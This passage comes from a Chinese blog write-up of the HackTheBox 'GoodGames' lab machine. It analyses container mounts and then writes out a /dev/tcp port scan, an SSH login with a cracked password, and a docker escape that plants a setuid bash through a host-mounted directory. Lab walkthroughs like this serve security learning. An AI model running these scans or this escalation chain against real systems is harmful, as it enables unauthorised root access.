+<h4 id="1-先明确：容器内部的“虚拟文件系统”长什么样？"><a href="#1-先明确：容器内部的“虚拟文件系统”长什么样？" class="headerlink" title="1. 先明确：容器内部的“虚拟文件系统”长什么样？"></a>1. 先明确：容器内部的“虚拟文件系统”长什么样？</h4><p>在你的<code>mount</code>结果中，容器内部的虚拟文件系统有以下特征（可对比参考）：  </p>
+<ul>
+<li><strong>根目录（&#x2F;）</strong>：<code>overlay on / type overlay (...)</code><br><code>overlay</code>是Docker默认的“分层文件系统”，完全属于容器内部，用于存储容器自身的文件（如系统命令、应用代码），<strong>与宿主机无关</strong>；  </li>
+<li><strong>虚拟设备目录</strong>：<code>tmpfs on /dev type tmpfs (...)</code>、<code>sysfs on /sys type sysfs (...)</code>、<code>proc on /proc type proc (...)</code><br>这些是Linux内核提供的“虚拟文件系统”（tmpfs&#x2F;sysfs&#x2F;proc），仅用于容器与内核交互（如查看进程、系统参数），<strong>不是宿主机的实体存储</strong>。</li>
+</ul>
+<h4 id="2-再看-home-augustus的挂载源：-dev-sda1是宿主机的实体硬盘分区"><a href="#2-再看-home-augustus的挂载源：-dev-sda1是宿主机的实体硬盘分区" class="headerlink" title="2. 再看/home/augustus的挂载源：/dev/sda1是宿主机的实体硬盘分区"></a>2. 再看<code>/home/augustus</code>的挂载源：<code>/dev/sda1</code>是宿主机的实体硬盘分区</h4><p><code>/dev/sda1</code>是Linux系统中<strong>典型的宿主机实体硬盘分区标识</strong>：  </p>
+<ul>
+<li><code>/dev/sdX</code>是Linux对“SATA&#x2F;SCSI硬盘”的设备命名（X为a、b、c等，代表第一块、第二块硬盘）；  </li>
+<li><code>1</code>代表该硬盘的第一个分区（通常是宿主机的根分区或数据分区）。</li>
+</ul>
+<p>容器内部不会存在<code>/dev/sda1</code>这样的“宿主机实体硬盘分区”——只有当宿主机通过<code>docker run -v /home/augustus:/home/augustus</code>（目录挂载）命令，将自身的<code>/home/augustus</code>目录挂载到容器内时，容器的<code>mount</code>结果才会显示“挂载源为宿主机的<code>/dev/sda1</code>”。  </p>
+<p>结合文章中“<code>/etc/passwd</code>无augustus用户但目录存在”的矛盾（容器内无该用户，说明目录不属于容器自身），进一步印证：<code>/home/augustus</code>的存储源是宿主机的<code>/dev/sda1</code>分区，即“从主机挂载”。</p>
+<h3 id="三、判断“具备读写权限”：看「挂载选项中的rw标识」"><a href="#三、判断“具备读写权限”：看「挂载选项中的rw标识」" class="headerlink" title="三、判断“具备读写权限”：看「挂载选项中的rw标识」"></a>三、判断“具备读写权限”：看「挂载选项中的<code>rw</code>标识」</h3><p>挂载选项<code>(rw,relatime,errors=remount-ro)</code>中，<strong><code>rw</code>是核心权限标识</strong>：  </p>
+<ul>
+<li><code>rw</code>：即<code>read-write</code>，表示该挂载点（<code>/home/augustus</code>）在正常情况下具备“可读可写”权限；  </li>
+<li>后面的<code>errors=remount-ro</code>是“容错配置”：仅当该分区出现硬件错误（如磁盘坏道）时，系统才会自动将其重新挂载为<code>ro</code>（read-only，只读），<strong>不影响正常情况下的读写权限</strong>。</li>
+</ul>
+<p>这与文章中“read write permission”的描述完全匹配——即容器内对<code>/home/augustus</code>的操作（如创建、修改文件），实际会同步到宿主机的<code>/home/augustus</code>目录（因为挂载源是宿主机的<code>/dev/sda1</code>）。</p>
+<h3 id="总结：判断逻辑链-1"><a href="#总结：判断逻辑链-1" class="headerlink" title="总结：判断逻辑链"></a>总结：判断逻辑链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 定位挂载条目 → /dev/sda1 on /home/augustus type ext4 (rw,...)</span><br><span class="line">2. 排除容器内部文件系统 → 不是overlay/tmpfs/sysfs/proc（这些是容器虚拟存储）</span><br><span class="line">3. 识别宿主机实体设备 → /dev/sda1是宿主机硬盘分区 → 确定“从主机挂载”</span><br><span class="line">4. 解析权限选项 → 包含rw（正常可读可写） → 确定“具备读写权限”</span><br></pre></td></tr></table></figure></blockquote>
+<blockquote>
+<p>让我们稍微列举一下，找找正在运行的进程和一些有漏洞的脚本之类的东西。什么都没找到，但有一件事很显眼。运行ifconfig命令得到了docker的IP地址。</p>
+</blockquote>
+<p><img src="/image/Goodgames/5b722873cd88108fac0a27443e585d92_MD5.jpeg"></p>
+<p>发现IP为<code>172.19.0.2</code></p>
+<blockquote>
+<p>现在我们的实例有IP 172.19.0.2，这可能意味着存在172.19.0.1，该IP通常是网络中分配给主机的第一个IP。让我们检查一下。或者你可以通过运行一个范围的for循环来枚举。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 172.19.0.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/c184e7840af6231e94bed7b45cf548ec_MD5.jpeg"></p>
+<blockquote>
+<p>这里不要犯和我一样的毛病，使用ping的时候设置一下ping的次数，否则你执行<code>Ctrl+c</code>就只能重新弹一个shell回来了</p>
+</blockquote>
+<h2 id="内部存活主机以及端口的扫描-bash"><a href="#内部存活主机以及端口的扫描-bash" class="headerlink" title="内部存活主机以及端口的扫描 - bash"></a>内部存活主机以及端口的扫描 - bash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..254&#125;; do (ping -c 1 172.19.0.$&#123;i&#125; | grep &quot;bytes from&quot; | grep -v &quot;Unreachable&quot; &amp;); done;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/1a50d18e1fec7a14a465ae0923a9cb5f_MD5.jpeg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for port in $(seq 1 1000); do (echo &quot;blah&quot; &gt; /dev/tcp/172.19.0.1/$port &amp;&amp; echo &quot;open - $port&quot;) 2&gt;/dev/null; done</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/34dbc4d7f0cea32572206ce6b7ea92b9_MD5.jpeg"></p>
+<p>快速对<code>172.19.0.1</code>执行<code>curl</code>命令会返回该网站，这表明该端口正通过主机转发回此容器。</p>
+<blockquote>
+<p>22端口是开放的，80端口也是开放的。80端口是我们在goodgames.htb上看到的网站，但我们扫描10.10.11.130时，22端口并没有开放。让我们尝试用破解的密码以augustus用户身份进行ssh登录。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh augustus@172.19.0.1  # superadministrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/c59ad2feb73ce154bc4170c0a907ba32_MD5.jpeg"></p>
+<p>使用下面命令即可规避这个错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/90bd75918db4b45026030df39ac925ae_MD5.jpeg"></p>
+<blockquote>
+<p>现在这个目录和我们在docker机器上的目录是一样的，只是在这里我们是augustus用户，而在docker里是root用户。无论我们在这个目录里创建什么，都可以通过另一种方式访问到，无论是在docker外部还是内部。</p>
+<p>现在有多种方法可以从这里获取root权限。</p>
+<ol>
+<li>在主机上将&#x2F;bin&#x2F;bash以augustus的身份复制到主目录，然后在docker中通过SUID二进制文件将其用户更改为root。接着，在主机上以augustus的身份以root权限运行它。</li>
+<li>或者在docker中复制&#x2F;bin&#x2F;sh，它将自动归root所有，因为你在docker中是root，可以设置suid权限。现在在主机上运行它，你就会成为root。</li>
+<li>但你不能在docker中复制&#x2F;bin&#x2F;bash并在主机上运行，因为bash使用了不同的共享库。</li>
+</ol>
+</blockquote>
+<p>这是<code>Avinash kumar</code>的方法，<code>0xdf</code>的方法也是有一样的，他对此有这样的解释，我就简单粗暴的直接截个图吧</p>
+<p><img src="/image/Goodgames/2502b721263e22804fe93647f3fffe26_MD5.jpeg"></p>
+<p>也就是说从容器里面创建的文件为root权限，主机也同样会将其视为root权限，下面来进行操作</p>
+<h2 id="Docker逃逸的具体操作"><a href="#Docker逃逸的具体操作" class="headerlink" title="Docker逃逸的具体操作"></a>Docker逃逸的具体操作</h2><p>将<code>/bin/bash</code>复制到主机上augustus的主目录中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash .</span><br><span class="line">cd /home/augustus</span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/008614d139c22eb6ade1383208bf8b7a_MD5.jpeg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chown root:root bash</span><br><span class="line">chmod 4777 bash</span><br><span class="line">ls -l bash</span><br><span class="line"></span><br><span class="line">ssh augustus@172.19.0.1  # superadministrator</span><br><span class="line">ls -la</span><br><span class="line">./bash -p</span><br><span class="line">id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/dbdc96234896f5c8112bac19087bccc9_MD5.jpeg"></p>
+<p>成功提权</p>
+<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>对于这个机器，学到了非常多的知识，扩展出来的一些问题通过AI的解答也都能得到很好的理解，学习方法有了进一步的提升，机器涉及到的漏洞测试方法以及对我而言陌生的SSTI，还有对于机器后续的权限提升同样都是我需要努力学习的知识</p>
+<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p><a target="_blank" rel="noopener" href="https://blog.0xzon.dev/2022-03-04-HTB-GoodGames/">HTB GoodGames Writeup | Aaron Haymore</a><br><a target="_blank" rel="noopener" href="https://newrouge.blogspot.com/2022/02/goodgames-hackthebox.html">GoodGames - HackTheBox</a><br><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2022/02/23/htb-goodgames.html">HTB: GoodGames | 0xdf hacks stuff</a><br><a target="_blank" rel="noopener" href="https://7rocky.github.io/en/htb/goodgames/">GoodGames | 7Rocky</a><br><a target="_blank" rel="noopener" href="https://arz101.medium.com/hackthebox-goodgames-20358b06420c">HackTheBox — GoodGames. Hello everyone , in this post I will be… | by ARZ101 | Medium</a></p>
+<h1 id="欠缺的知识"><a href="#欠缺的知识" class="headerlink" title="欠缺的知识"></a>欠缺的知识</h1><ul>
+<li>sqlmap使用方法，使用场景，时间盲注手动测试方法</li>
+<li>SSTI模板注入漏洞</li>
+<li>docker逃逸，判断shell是否存在于docker的方法</li>
+<li>关于从mount结果判断用户是否从主机挂载的方法</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://111yl111.github.io">Mszr</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://111yl111.github.io/2025/09/03/Goodgames/">http://111yl111.github.io/2025/09/03/Goodgames/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://111yl111.github.io" target="_blank">Mszr</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HTB/">HTB</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><div class="post-share"><div class="social-share" data-image="/image/L.jpg" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/09/01/OSCP+%E5%AD%A6%E4%B9%A0%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/" title="OSCP+学习经验分享"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">OSCP+学习经验分享</div></div><div class="info-2"><div class="info-item-1">什么是OSCP+对于OSCP+，相信还是有很多小伙伴甚至是从事网安的工作者都还不够了解，或许你有可能是从朋友那里听说过，或许是看到一篇技术文章提到过，那么下面，就让我以比较官方的说明来表达，究竟什么是OSCP+？他究竟有什么作用？  OSCP+（Offensive Security Certified Professional Plus）是由全球网络安全领域权威机构Offensive Security推出的进阶版实战型渗透测试认证，作为经典OSCP（Offensive Security Certified Professional）认证的升级方向，它聚焦于更复杂、更贴近企业真实场景的高级渗透测试与红队作战能力培养。该认证核心覆盖高级漏洞利用技术（如针对复杂应用、物联网设备的漏洞挖掘与利用）、多阶段攻击链构建（含初始 foothold 获取、横向移动、权限提升、数据窃取等全流程战术设计）、防御机制规避（如绕过EDR、SIEM监控、防火墙策略等），以及企业级目标的持续渗透与权限维持等深度技能；其考核采用纯实战模式，要求考生在限定时间内对多个相互关联的模拟企业网络目标完成渗透测试，并提...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div class="comment-switch"><span class="first-comment">Valine</span><span id="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/L.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Mszr</div><div class="author-info-description">认证：OSCP+，CISP-PTE</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/111yl111"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/111yl111" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/image/wechat.jpg" target="_blank" title="微信"><i class="fab fa-weixin" style="color: #07C160;"></i></a><a class="social-icon" href="/image/wechat_gong.jpg" target="_blank" title="微信公众号"><i class="fas fa-user-circle" style="color: #07C160;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客！！！ ​本博客聚焦渗透测试实战，分享红队技术细节（漏洞分析、渗透路径、工具优化、攻防复盘等）。 ​重要声明：所有内容基于合法授权测试，遵守《网络安全法》，抵制任何恶意攻击，坚守 “技术用于守护” 的底线。 ​同行可交流实战难点，学习者可提问探讨，我们共同夯实安全认知。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Website-80"><span class="toc-number">1.1.</span> <span class="toc-text">Website 80</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-sqlmap-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.1.</span> <span class="toc-text">SQL注入 - sqlmap - 时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.1.2.</span> <span class="toc-text">密码破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8Esqlmap%E4%BD%BF%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%96%91%E6%83%91%E4%B8%8E%E6%80%9D%E8%80%83"><span class="toc-number">1.1.3.</span> <span class="toc-text">对于sqlmap使用的一些疑惑与思考</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%80%BB%E8%BE%91%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.1.4.</span> <span class="toc-text">时间盲注的基本逻辑回顾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E4%B8%8D%E6%96%AD%E5%A2%9E%E5%8A%A0%E5%BB%B6%E8%BF%9F%EF%BC%9F"><span class="toc-number">1.1.5.</span> <span class="toc-text">为什么需要不断增加延迟？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8E%9F%E5%A7%8B%E5%BB%B6%E8%BF%9F%E6%97%B6%E9%97%B4%E4%B8%8D%E8%B6%B3%E4%BB%A5%E5%8C%BA%E5%88%86%E2%80%9C%E7%9C%9F-%E5%81%87%E2%80%9D%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">1. 原始延迟时间不足以区分“真&#x2F;假”条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9E%84%E5%BB%BA%E6%9B%B4%E7%A8%B3%E5%AE%9A%E7%9A%84%E2%80%9C%E7%BB%9F%E8%AE%A1%E6%A8%A1%E5%9E%8B%E2%80%9D"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">2. 构建更稳定的“统计模型”</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E7%9A%84%E6%A0%B8%E5%BF%83%E9%A3%8E%E9%99%A9"><span class="toc-number">1.1.7.</span> <span class="toc-text">一、自动化测试的核心风险</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E6%88%98%E5%9C%BA%E6%99%AF%E7%9A%84%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%A1%88"><span class="toc-number">1.1.8.</span> <span class="toc-text">二、实战场景的替代方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%A7%84%E8%8C%83"><span class="toc-number">1.1.9.</span> <span class="toc-text">三、生产环境的安全测试规范</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%B7%A5%E5%85%B7%E9%93%BE%E4%BC%98%E5%8C%96%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.1.10.</span> <span class="toc-text">四、工具链优化建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.11.</span> <span class="toc-text">五、总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95-%E9%AA%8C%E8%AF%81%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.12.</span> <span class="toc-text">手工测试 - 验证时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E7%BB%93%E6%9E%84%EF%BC%9A%E9%97%AD%E5%90%88%E5%8E%9F%E5%A7%8BSQL%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.1.13.</span> <span class="toc-text">1. 基础结构：闭合原始SQL语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B3%A8%E5%85%A5%E6%A0%B8%E5%BF%83%EF%BC%9A%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E5%88%A4%E6%96%AD"><span class="toc-number">1.1.14.</span> <span class="toc-text">2. 注入核心：时间延迟判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AF%AD%E6%B3%95%E8%A1%A5%E5%85%A8%EF%BC%9A%E7%A1%AE%E4%BF%9DSQL%E8%AF%AD%E5%8F%A5%E5%90%88%E6%B3%95"><span class="toc-number">1.1.15.</span> <span class="toc-text">3. 语法补全：确保SQL语句合法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E4%BD%9C%E7%94%A8"><span class="toc-number">1.1.16.</span> <span class="toc-text">整体作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0-%E5%88%A9%E7%94%A8SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%89%A7%E8%A1%8C%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.1.17.</span> <span class="toc-text">登录后台 - 利用SSTI模板注入漏洞执行反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%85%88%E6%98%8E%E7%A1%AE%EF%BC%9ASSTI%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.18.</span> <span class="toc-text">一、先明确：SSTI漏洞的本质是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SSTI%E4%B8%8EPython%E7%9A%84%E6%A0%B8%E5%BF%83%E8%81%94%E7%B3%BB%EF%BC%9APython-Web%E7%94%9F%E6%80%81%E9%AB%98%E5%BA%A6%E4%BE%9D%E8%B5%96%E2%80%9C%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E2%80%9D"><span class="toc-number">1.1.19.</span> <span class="toc-text">二、SSTI与Python的核心联系：Python Web生态高度依赖“模板引擎”</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Python-Web%E6%A1%86%E6%9E%B6%E4%B8%8E%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E2%80%9C%E5%BC%BA%E7%BB%91%E5%AE%9A%E2%80%9D"><span class="toc-number">1.1.19.1.</span> <span class="toc-text">1. Python Web框架与模板引擎的“强绑定”</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Python%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E2%80%9C%E9%A3%8E%E9%99%A9%E7%82%B9%E2%80%9D%EF%BC%9A%E5%BC%80%E5%8F%91%E8%80%85%E5%AE%B9%E6%98%93%E7%8A%AF%E7%9A%84%E9%94%99"><span class="toc-number">1.1.19.2.</span> <span class="toc-text">2. Python模板引擎的“风险点”：开发者容易犯的错</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88%E2%80%9C%E7%9C%8B%E5%88%B0Python%E5%BA%94%E7%94%A8%E5%B0%B1%E4%BC%98%E5%85%88%E6%B5%8BSSTI%E2%80%9D%EF%BC%9F"><span class="toc-number">1.1.20.</span> <span class="toc-text">三、为什么“看到Python应用就优先测SSTI”？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Python%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E2%80%9C%E6%B3%A8%E5%85%A5%E6%A0%87%E8%AF%86%E2%80%9D%E6%9E%81%E5%AE%B9%E6%98%93%E9%AA%8C%E8%AF%81"><span class="toc-number">1.1.20.1.</span> <span class="toc-text">1. Python模板引擎的“注入标识”极容易验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%96%87%E7%AB%A0%E5%9C%BA%E6%99%AF%E7%9A%84%E2%80%9C%E7%B2%BE%E5%87%86%E6%8C%87%E5%90%91%E2%80%9D%EF%BC%9A%E5%B7%B2%E7%A1%AE%E8%AE%A4%E6%98%AFFlask%E5%BA%94%E7%94%A8"><span class="toc-number">1.1.20.2.</span> <span class="toc-text">2. 文章场景的“精准指向”：已确认是Flask应用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93%EF%BC%9A%E6%A0%B8%E5%BF%83%E9%80%BB%E8%BE%91%E9%93%BE"><span class="toc-number">1.1.21.</span> <span class="toc-text">四、总结：核心逻辑链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E4%BB%8E%E2%80%9CWerkzeug%E6%9C%8D%E5%8A%A1%E5%99%A8%E2%80%9D%E9%94%81%E5%AE%9A%E2%80%9CFlask%E6%A1%86%E6%9E%B6%E2%80%9D%EF%BC%88%E5%9F%BA%E7%A1%80%E5%89%8D%E6%8F%90%EF%BC%89"><span class="toc-number">1.1.22.</span> <span class="toc-text">第一步：从“Werkzeug服务器”锁定“Flask框架”（基础前提）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E4%BB%8E%E2%80%9CFlask%E6%A1%86%E6%9E%B6%E2%80%9D%E5%85%B3%E8%81%94%E2%80%9CJinja2%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E2%80%9D%EF%BC%88%E7%94%9F%E6%80%81%E5%B8%B8%E8%AF%86%EF%BC%89"><span class="toc-number">1.1.23.</span> <span class="toc-text">第二步：从“Flask框架”关联“Jinja2模板引擎”（生态常识）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%94%A8%E2%80%9CSSTI%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C%E2%80%9D%E9%AA%8C%E8%AF%81%E2%80%9CJinja2%E7%89%B9%E6%80%A7%E2%80%9D%EF%BC%88%E6%9C%80%E7%BB%88%E7%A1%AE%E8%AE%A4%EF%BC%89"><span class="toc-number">1.1.24.</span> <span class="toc-text">第三步：用“SSTI测试结果”验证“Jinja2特性”（最终确认）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%9D%A5%E6%BA%90%E7%9A%84%E6%A0%B8%E5%BF%83%E9%80%BB%E8%BE%91"><span class="toc-number">1.1.25.</span> <span class="toc-text">总结：信息来源的核心逻辑</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-docker%E9%80%83%E9%80%B8"><span class="toc-number">2.</span> <span class="toc-text">权限提升 - docker逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%ADshell%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BA%8Edocker%E4%B8%AD"><span class="toc-number">2.1.</span> <span class="toc-text">判断shell是否存在于docker中</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%AC%AC%E4%B8%80%E7%BA%BF%E7%B4%A2%EF%BC%9A%E5%BC%82%E5%B8%B8%E7%9A%84hostname%EF%BC%88%E5%88%9D%E6%AD%A5%E6%80%80%E7%96%91%EF%BC%89"><span class="toc-number">2.1.1.</span> <span class="toc-text">1. 第一线索：异常的hostname（初步怀疑）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%A0%B8%E5%BF%83%E9%AA%8C%E8%AF%81%EF%BC%9A-proc-1-cgroup%E6%96%87%E4%BB%B6%E7%9A%84Docker%E6%A0%87%E8%AF%86%EF%BC%88%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%EF%BC%89"><span class="toc-number">2.1.2.</span> <span class="toc-text">2. 核心验证：&#x2F;proc&#x2F;1&#x2F;cgroup文件的Docker标识（关键证据）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BE%85%E5%8A%A9%E7%BA%BF%E7%B4%A2%EF%BC%9A%E5%BC%82%E5%B8%B8%E7%9A%84%E7%94%A8%E6%88%B7%E4%B8%8E%E6%8C%82%E8%BD%BD%E7%9B%AE%E5%BD%95%EF%BC%88%E4%BE%A7%E9%9D%A2%E5%8D%B0%E8%AF%81%EF%BC%89"><span class="toc-number">2.1.3.</span> <span 